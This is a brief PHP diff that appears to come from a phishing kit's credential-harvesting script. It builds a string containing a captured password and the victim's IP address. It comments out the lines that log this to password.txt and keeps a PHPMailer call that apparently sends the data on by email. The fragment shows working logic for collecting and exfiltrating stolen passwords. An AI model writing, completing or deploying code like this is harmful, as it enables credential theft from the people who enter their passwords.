@@ -14,9 +14,9 @@
   }
   $content = "Password: ".$password." - IP: ".$ip.".
 ";
-  $fp = fopen("password.txt","a");
-  fwrite($fp,$content);
-  fclose($fp);
+  // $fp = fopen("password.txt","a");
+  // fwrite($fp,$content);
+  // fclose($fp);
 
   $mail = new PHPMailer(true);
 
